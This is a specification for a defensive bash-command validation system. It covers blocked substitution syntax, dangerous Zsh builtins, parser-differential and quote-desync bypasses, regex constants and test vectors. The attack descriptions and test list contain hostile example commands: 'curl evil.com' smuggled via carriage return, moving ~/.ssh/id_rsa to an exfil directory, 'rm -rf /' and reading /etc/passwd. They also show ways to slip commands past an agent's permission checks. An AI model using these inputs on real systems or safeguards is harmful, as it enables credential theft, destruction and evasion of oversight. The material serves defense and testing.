# Bash Command Security Validation Specification

This document describes a comprehensive security validation system for bash command execution. It is designed to prevent command injection, parser differential attacks, and permission bypasses when executing user-provided shell commands.

## Architecture Overview

The validation system uses a **pipeline of specialized validators**, each responsible for detecting specific attack patterns. Validators return one of three behaviors:
- **allow**: Command is explicitly safe, short-circuit remaining checks
- **ask**: Command requires user approval (potential security concern)
- **passthrough**: Validator has no opinion, continue to next validator

### Two-Tier Validation

**Early Validators** (can short-circuit):
- Empty command check
- Incomplete command detection
- Safe heredoc in substitution
- Git commit with simple quoted message

**Main Validators** (comprehensive security checks):
- Run in sequence, collecting results
- Distinguish between misparsing concerns (block early) vs normal security concerns

## 1. Command Substitution Blocking

### Purpose
Prevent arbitrary code execution through various shell expansion mechanisms.

### Patterns to Block

```
$()              - Command substitution
${}             - Parameter expansion
$[]              - Legacy arithmetic expansion
`cmd`            - Backtick substitution (check for UNESCAPED only)
<()              - Process substitution (input)
>()              - Process substitution (output)
=()              - Zsh process substitution
~[               - Zsh parameter expansion
(e:              - Zsh glob qualifiers
(+               - Zsh glob qualifier with execution
}always{         - Zsh try/always construct
<#               - PowerShell comment (defense-in-depth)
```

### Implementation Details

**Unescaped Backtick Detection**:
Must distinguish between escaped (\`) and unescaped backticks. Escaped backticks are safe and commonly used in SQL commands.

```
Algorithm:
1. Iterate through command string character by character
2. Track escape state: backslash escapes the next character
3. Track quote state: backticks inside single quotes are literal
4. Return true if unescaped backtick found outside single quotes
```

**Zsh Equals Expansion**:
Block `=cmd` at word start (e.g., `=curl`). In Zsh, `=cmd` expands to `$(which cmd)`, bypassing allowlist rules that check the base command.

Pattern: `(?:^|[\s;&|])=[a-zA-Z_]`

## 2. Zsh Dangerous Command Blocking

### Purpose
Zsh provides builtins that enable capabilities like raw file I/O, network access, and pseudo-terminal execution that circumvent normal permission checks.

### Blocked Commands

**Gateway Commands**:
- `zmodload` - Loads kernel modules enabling dangerous capabilities
- `emulate` with `-c` flag - Eval-equivalent that executes arbitrary code

**Module Builtins** (require zmodload, but blocked defense-in-depth):
- `sysopen`, `sysread`, `syswrite`, `sysseek` - Raw file descriptor operations
- `zpty` - Pseudo-terminal command execution
- `ztcp`, `zsocket` - Network connections for exfiltration
- `zf_rm`, `zf_mv`, `zf_ln`, `zf_chmod`, `zf_chown`, `zf_mkdir`, `zf_rmdir`, `zf_chgrp` - File operations that bypass binary checks

**History/Editor Commands**:
- `fc -e` - Executes arbitrary editor on command history

### Base Command Extraction

Must handle command modifiers and environment assignments:

```
Input: "FOO=bar command builtin zmodload"
Output: "zmodload"

Algorithm:
1. Trim leading whitespace
2. Split on whitespace
3. Skip tokens matching: ^[A-Za-z_]\w*= (env assignments)
4. Skip tokens in ZSH_PRECOMMAND_MODIFIERS: {command, builtin, noglob, nocorrect}
5. First remaining token is base command
```

## 3. Heredoc Security Validation

### Purpose
Heredocs in command substitution (`$(cat <<'DELIM')`) can hide arbitrary command execution if not properly validated.

### Safe Pattern Requirements

Only allow this specific pattern:
```
[prefix] $(cat <<'DELIM'\n
[body lines]\n
DELIM\n
) [suffix]
```

**Requirements**:
1. Delimiter must be single-quoted (`'EOF'`) or escaped (`\EOF`) - body is literal
2. Closing delimiter must be on its own line (or `DELIM)` for inline form)
3. Closing delimiter must be the FIRST occurrence (bash behavior)
4. The `$()` must be in ARGUMENT position, not command-name position
5. Remaining text after stripping heredocs must pass all validators

### Line-Based Matching Algorithm

Do NOT use regex `\s\S*?` for body matching. Bash closes heredocs at the FIRST matching line.

```
Algorithm for each heredoc match:
1. Verify opening line ends after delimiter (only horizontal whitespace)
2. Body starts after the newline
3. For each body line:
   a. Strip leading tabs if using <<- (strip one tab only)
   b. Check if line exactly matches delimiter (Form 1)
   c. Check if line starts with delimiter followed by `)` (Form 2)
   d. Form 1: verify `)` is on next line with only whitespace before it
4. Compute absolute positions, accounting for newlines
5. Verify no nested matches (inner match inside outer body)
6. Strip in reverse order (last first) to maintain indices
7. Verify prefix exists before first $(
8. Validate remaining content passes all security checks
```

### Critical Security Notes

- Use `[ \t]` (space/tab) not `\s` between `<<` and delimiter - `\s` matches newlines
- Must have boundary check `(?=\s|$)` after redirection patterns
- Without boundary check, `> /dev/nullo` matches as prefix, leaving `o`, bypassing checks

## 4. Parser Differential Protections

### 4.1 Backslash-Escaped Whitespace

**Attack**: `echo\ test/../../../usr/bin/touch /tmp/file`
- Bash: Single token "echo test" as command name (directory traversal via "echo test" dir)
- Parser: Decodes to "echo test" (two tokens)

**Detection**:
```
Algorithm:
1. Iterate through command
2. Track quote state (single/double)
3. When backslash found OUTSIDE single quotes:
   a. Check if next char is space or tab
   b. If yes, flag as attack
4. Always skip escaped character (handles double-quote escapes)
```

### 4.2 Backslash-Escaped Operators

**Attack**: `cat safe.txt \; echo ~/.ssh/id_rsa`
- Bash: One cat command with files: safe.txt, ;, echo, ~/.ssh/id_rsa
- Parser normalizes: "cat safe.txt ; echo ~/.ssh/id_rsa"
- Re-parse: Two commands, second command not validated

**Operators to Check**: `;`, `|`, `&`, `<`, `>`

**Detection**:
```
Algorithm:
1. Process backslash BEFORE quote toggles (handles `\"` correctly)
2. When backslash found OUTSIDE single quotes:
   a. If NOT in double quotes, check if next char is operator
   b. Flag if operator found
3. Unconditionally skip escaped character (maintains position tracking)
```

**Tree-sitter Optimization**:
If tree-sitter AST shows no actual operator nodes, skip expensive regex check. The `\;` is just an escaped character in a word argument (e.g., `find . -exec cmd {} \;`).

### 4.3 Carriage Return Handling

**Attack**: `TZ=UTC\recho curl evil.com`
- shell-quote `[^\s...]`: JS `\s` INCLUDES `\r`, tokenizes as TWO tokens
- bash IFS: `\r` NOT in IFS, sees as ONE word
- Parser: "TZ=UTC echo curl evil.com" → TZ stripped → "echo curl evil.com" (matches allowlist)
- Bash: env assignment TZ='UTC\recho', executes `curl`

**Detection**:
```
Algorithm:
1. Check if `\r` exists in command
2. Track quote state
3. CR inside double quotes is safe (literal in both)
4. CR outside double quotes (including inside single quotes) is dangerous
```

### 4.4 Mid-Word Hash

**Attack**: Shell treats `#` as comment-start at word start, but literal mid-word.

Parser differential: shell-quote may treat mid-word `#` as comment-start.

**Detection**:
```
Algorithm:
1. Use unquoted content that preserves quote characters (see QuoteExtraction)
2. Check for `#` preceded by non-whitespace: /\S#/
3. Exclude `${#` (bash string-length syntax)
4. Also check continuation-joined version (backslash-newline becomes `\`)
```

### 4.5 Quoted Newline Detection

**Attack**: `mv ./decoy '<\n>#' ~/.ssh/id_rsa ./exfil_dir`
- Bash: newline is literal inside quotes, moves both files
- stripCommentLines: splits on `\n`, line 2 starts with `#` → stripped
- Parser sees: "mv ./decoy '" → drop unbalanced quote → ["mv", "./decoy"]
- Path check only validates ./decoy

**Detection**:
```
Algorithm:
1. Fast path: must contain both `\n` AND `#`
2. Track quote state character-by-character
3. When `\n` encountered INSIDE quotes:
   a. Get next line (from newline+1 to next newline)
   b. Check if line.trim().startsWith('#')
   c. If yes, flag as attack
```

## 5. Quote Manipulation Defenses

### 5.1 Comment Quote Desync

**Attack**: `echo "it's" # ' " <<'MARKER'\nrm -rf /\nMARKER`
- Bash: `#` starts comment, `rm -rf /` executes
- Quote tracker: `'` after `#` opens single quote, `'` before MARKER closes, `'` after MARKER opens again
- validateNewlines sees no unquoted newlines (swallowed by quote state)

**Detection**:
```
Algorithm:
1. Track quote state (same logic as extractQuotedContent)
2. When unquoted `#` encountered:
   a. Extract comment text (to end of line)
   b. If comment contains `'` or `"`, flag as attack
3. Skip to end of line
```

**Tree-sitter Optimization**:
If tree-sitter provides quote context, skip this check (AST is authoritative regardless of comments).

### 5.2 Obfuscated Flags

Comprehensive detection of flag obfuscation attempts:

**ANSI-C Quoting**: `$'...'` - can encode any character via escape sequences
```
Pattern: /\$'[^']*'/
Examples to block:
- 'test'$'-exec' → concatenates to -exec
- $'\x2dexec' → -exec
```

**Locale Quoting**: `$"..."` - same capability as ANSI-C
```
Pattern: /\$"[^"]*"/
```

**Empty Quotes Before Dash**:
```
Patterns:
- /\$['"]{2}\s*-/ - $''-exec or $""-exec
- /(?:^|\s)(?:''|"")+\s*-/ - empty quotes before flag
- /(?:""|'')+['"]-/ - empty quote pair adjacent to quoted dash
- /(?:^|\s)['"]{3,}/ - 3+ consecutive quotes at word start
```

**Quoted Flag Detection**:
```
Algorithm:
1. Track quote state through entire command
2. When whitespace followed by quote found:
   a. Extract content inside quote
   b. Check if content starts with dash + alphanumeric
   c. Check if quote continues with flag continuation characters
   d. Follow chains of adjacent quoted segments
3. When whitespace followed by dash found:
   a. Collect flag content until whitespace, =, or quote+non-flag-char
   b. If flag contains quotes, flag as obfuscated
```

**Flag Continuation Characters**: `[a-zA-Z0-9\\${\]` - characters that can continue a flag after closing quote

**Special Case for `cut -d`**:
Allow quoted delimiter after `-d` (e.g., `cut -d','`), but restrict to `cut` command only to prevent bypasses like `find -e"xec"`.

## 6. Structural Validation

### 6.1 Incomplete Command Detection

Flag commands that appear to be fragments:
```
Patterns:
- ^\s*\t - starts with tab
- ^\s*- - starts with flags (no command)
- ^\s*(&&|\|\||;|>>?|<) - starts with operator
```

### 6.2 Malformed Token Injection

**Attack**: `echo {"hi":"hi;evil"}`
- shell-quote produces unbalanced tokens (e.g., `{hi:"hi`)
- Combined with command separators, can lead to eval re-parsing

**Detection**:
```
Algorithm:
1. Parse command with shell-quote parser
2. Check for command separators: ;, &&, ||
3. If separators present, check for malformed tokens (unbalanced delimiters)
4. Flag if both conditions met
```

### 6.3 Brace Expansion Detection

**Attack**: `git ls-remote {--upload-pack="touch /tmp/test",test}`
- Parser sees one literal arg
- Bash expands to: `--upload-pack="touch /tmp/test" test`

**Detection**:
```
Algorithm:
1. Check for mismatched brace counts after quote stripping
   - Count unescaped `{` and `}` in fullyUnquoted content
   - If closeCount > openCount, flag (quoted brace was stripped)
2. Check original command for quoted braces inside unquoted context
   - Pattern: /['"][{}]['"]/
   - Only check if unescaped `{` exists
3. For each unescaped `{`:
   a. Find matching unescaped `}` by tracking nesting depth
   b. Scan between them at depth=0 for `,` or `..`
   c. Flag if found (comma-separated or sequence expansion)
```

**isEscapedAtPosition**:
```
Function to check if character at position is escaped:
1. Count consecutive backslashes before position
2. Odd count = escaped, even count = not escaped
```

## 7. Data Exfiltration Prevention

### 7.1 Proc Filesystem Blocking

Block access to environment variable exposure:
```
Pattern: /\/proc\/.*\/environ/
Catches:
- /proc/self/environ
- /proc/1/environ
- /proc/*/environ
```

### 7.2 Redirection Validation

Block input/output redirection operators in unquoted content:
```
Input redirection: <
Output redirection: >
```

Use fully unquoted content (strip both single and double quotes).

### 7.3 IFS Injection Detection

IFS variable can bypass regex validation by changing word splitting behavior.

```
Patterns:
- $IFS
- ${...IFS...} (any parameter expansion containing IFS)
```

## 8. Control Character Sanitization

Block non-printable control characters that bash silently drops but could confuse validators:

```
Character ranges:
- 0x00-0x08 (NULL through backspace)
- 0x0B-0x0C (vertical tab, form feed)
- 0x0E-0x1F (shift out through unit separator)
- 0x7F (DEL)

Excluded (handled separately):
- 0x09 (tab)
- 0x0A (newline)
- 0x0D (carriage return)
```

## 9. Command-Specific Validators

### 9.1 Git Commit Validation

Special handling for `git commit -m` to allow simple quoted messages while preventing injection.

**Requirements**:
1. Must match: `^git[ \t]+commit[ \t]+[^;&|`$<>()\n\r]*?-m[ \t]+(["'])([\s\S]*?)\1(.*)$`
   - `[ \t]+` not `\s+` (don't match newlines)
   - `[^;&|`$<>()\n\r]*?` excludes shell metacharacters before `-m`
2. If backslash in original command, bail to full validation
3. If double-quoted message contains `$() `, `` ` ``, or `${}`, flag
4. Check remainder for shell operators: `[;|&()]|\$\(|\$\{`
5. If remainder has unquoted `<>` or `>`, bail (redirects)
6. Block messages starting with dash

### 9.2 jq Command Validation

jq has `system()` function and dangerous flags:

```
Block patterns:
- \bsystem\s*\( - system() function call
- (?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path) - dangerous flags
```

## 10. Quote Extraction System

### QuoteExtraction Type

```typescript
type QuoteExtraction = {
  withDoubleQuotes: string  // Content outside single quotes (double quotes included)
  fullyUnquoted: string     // Content outside both quote types
  unquotedKeepQuoteChars: string  // Strips quoted content but keeps '"/" delimiters
}
```

### Algorithm

```
Function extractQuotedContent(command, isJq = false):
  Initialize: withDoubleQuotes='', fullyUnquoted='', unquotedKeepQuoteChars=''
  State: inSingleQuote=false, inDoubleQuote=false, escaped=false

  For each character:
    If escaped:
      Clear escaped state
      If not inSingleQuote: append to withDoubleQuotes
      If not inSingleQuote and not inDoubleQuote: append to fullyUnquoted
      If not inSingleQuote and not inDoubleQuote: append to unquotedKeepQuoteChars
      Continue

    If char is '\' and not inSingleQuote:
      Set escaped=true
      If not inSingleQuote: append to withDoubleQuotes
      If not inSingleQuote and not inDoubleQuote: append to fullyUnquoted
      If not inSingleQuote and not inDoubleQuote: append to unquotedKeepQuoteChars
      Continue

    If char is "'" and not inDoubleQuote:
      Toggle inSingleQuote
      Append to unquotedKeepQuoteChars
      Continue

    If char is '"' and not inSingleQuote:
      Toggle inDoubleQuote
      Append to unquotedKeepQuoteChars
      If not isJq: continue (skip adding to withDoubleQuotes for non-jq)

    If not inSingleQuote: append to withDoubleQuotes
    If not inSingleQuote and not inDoubleQuote: append to fullyUnquoted
    If not inSingleQuote and not inDoubleQuote: append to unquotedKeepQuoteChars
```

### Safe Redirection Stripping

Before validation, strip safe redirections to reduce false positives:
```
Patterns to strip (with boundary check (?=\s|$)):
- \s+2\s*>&\s*1 - stderr to stdout redirect
- [012]?\s*>\s*\/dev\/null - output to /dev/null
- \s*<\s*\/dev\/null - input from /dev/null
```

## 11. Validation Context

The context object passed to all validators:

```typescript
type ValidationContext = {
  originalCommand: string           // Raw command as provided
  baseCommand: string               // First word (command name)
  unquotedContent: string           // withDoubleQuotes (for dangerous pattern checks)
  fullyUnquotedContent: string      // After stripSafeRedirections (for most checks)
  fullyUnquotedPreStrip: string     // Before redirection stripping (for newline checks)
  unquotedKeepQuoteChars: string    // Preserves quote delimiters (for mid-word hash)
  treeSitter?: TreeSitterAnalysis   // Optional AST analysis
}
```

## 12. Tree-Sitter Integration

When tree-sitter is available:
1. Parse command to AST
2. Extract quote context from AST (more accurate than regex)
3. Check for divergence between AST and regex quote extraction
4. Use AST quote context as primary source
5. Skip regex-only checks when AST provides authoritative answer

### Divergence Detection

Log when regex and tree-sitter produce different quote contexts:
```
Compare: tsQuote.fullyUnquoted vs regexQuote.fullyUnquoted
         tsQuote.withDoubleQuotes vs regexQuote.withDoubleQuotes
Skip comparison for heredoc commands (expected divergence)
```

## 13. Execution Flow

```
1. Check for control characters → ask if found
2. Check for shell-quote single-quote bug → ask if found
3. Extract and process heredocs (quoted only)
4. Build validation context
5. Run early validators:
   - If any returns 'allow', short-circuit with passthrough
   - If any returns 'ask', return with isBashSecurityCheckForMisparsing=true
6. Run main validators in sequence:
   - Track deferred non-misparsing results
   - If misparsing validator returns 'ask', return immediately with flag
   - If non-misparsing validator returns 'ask', defer and continue
7. If deferred non-misparsing result exists, return it
8. Return passthrough (all checks passed)
```

## 14. Critical Security Constants

### Command Substitution Patterns

```javascript
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion (=cmd)' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  { pattern: /\$\[/, message: '$[] legacy arithmetic expansion' },
  { pattern: /~\[/, message: 'Zsh-style parameter expansion' },
  { pattern: /\(e:/, message: 'Zsh-style glob qualifiers' },
  { pattern: /\(\+/, message: 'Zsh glob qualifier with command execution' },
  { pattern: /\}\s*always\s*\{/, message: 'Zsh always block' },
  { pattern: /<#/, message: 'PowerShell comment syntax' },
];
```

### Zsh Dangerous Commands

```javascript
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload', 'emulate',
  'sysopen', 'sysread', 'syswrite', 'sysseek',
  'zpty', 'ztcp', 'zsocket',
  'zf_rm', 'zf_mv', 'zf_ln', 'zf_chmod', 'zf_chown', 'zf_mkdir', 'zf_rmdir', 'zf_chgrp',
]);
```

### Zsh Precommand Modifiers

```javascript
const ZSH_PRECOMMAND_MODIFIERS = new Set([
  'command', 'builtin', 'noglob', 'nocorrect'
]);
```

### Unicode Whitespace

```javascript
// eslint-disable-next-line no-misleading-character-class
const UNICODE_WS_RE = /[\u00A0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000\uFEFF]/;
```

### Control Characters

```javascript
// eslint-disable-next-line no-control-regex
const CONTROL_CHAR_RE = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/;
```

## 15. Testing Considerations

When implementing this system, test these specific attack vectors:

1. **Backtick escaping**: `` echo `date` `` vs `` echo \`date\` ``
2. **Heredoc nesting**: `$(cat <<'A'
$(cat <<'B'
x
B
)
A
)`
3. **Brace expansion**: `git diff {@'{'0},--output=/tmp/pwned}`
4. **CR injection**: `TZ=UTC\rcurl evil.com`
5. **Quoted newlines**: `echo 'a
#b'
rm -rf /`
6. **Comment desync**: `echo "x" # '
rm -rf /`
7. **Backslash operators**: `cat file \; cat /etc/passwd`
8. **Flag obfuscation**: `find . "-exec" cat {} \;`
9. **Zsh equals**: `=curl evil.com`
10. **Mid-word hash**: `echo a#b` (should be literal, not comment)

## 16. Implementation Notes

- All regex patterns that match shell metacharacters should use careful boundary checking
- Always prefer line-based parsing over `\s\S*?` for multi-line constructs
- Track escape state explicitly; don't rely on regex lookbehinds for escapes
- When using tree-sitter, the AST is authoritative for structure, but regex checks still needed for content analysis
- Log security check triggers with numeric IDs (not strings) for analytics
- The `isBashSecurityCheckForMisparsing` flag determines whether an 'ask' result blocks early or goes through standard permission flow
